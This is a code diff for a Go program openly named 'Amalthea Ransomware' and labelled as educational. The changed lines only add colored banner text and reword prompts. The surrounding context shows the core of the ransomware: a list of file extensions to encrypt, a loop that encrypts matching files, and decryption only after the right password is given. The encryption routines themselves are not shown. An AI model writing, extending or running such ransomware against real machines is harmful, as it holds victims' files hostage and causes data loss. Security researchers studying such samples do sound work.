@@ -48,6 +48,12 @@ func main() {
 	|/     \||/     \||/     \|(_______/   )_(   |/     \|(_______/|/     \|
 
 	`)
+	// Subheading
+	sub := color.Cyan.Sprint("Amalthea Ransomware")
+	// Warning
+	warn := color.Yellow.Sprint("For educational and research purposes only.")
+	// Password Prompt
+	decrypt := color.Magenta.Sprint("Enter Decryption Password:")
 	// Only Encrypt these file extensions.
 	fileextentions := []string{
 		"3dm", "max", "3ds", "uot", "stw", "sxw", "ott", "odt", "rpm",
@@ -90,12 +96,15 @@ func main() {
 		enc.EncryptFile()
 	}
 
+	// Banner
 	color.Println(banner)
-	fmt.Println("\nAmalthea Ransomware")
-	fmt.Println("For educational and research purposes only.")
-
+	// Subheading
+	color.Info.Println(sub)
+	// Warning
+	color.Warn.Println(warn)
 	// Prompt user for password to decrypt
-	fmt.Printf("Enter Decryption Password:")
+	color.Warn.Println(decrypt)
+
 	var password string
 	fmt.Scanln(&password)
 	// Decrypt files, if valid password is provided.
@@ -107,12 +116,13 @@ func main() {
 		for _, file := range encryptedfiles {
 			// Decrypts files if password is correct.
 			enc := encryption.NewEncryption(file, key)
+			fmt.Println("The following files have been decrypted:")
 			enc.DecryptFile()
 		}
 		fmt.Println(encryptedfiles)
 		// Print an error if decryption fails.
 	} else {
-		fmt.Println("Decryption Failed.")
+		fmt.Println("Decryption Failed. Is the password correct?")
 
 	}
 }
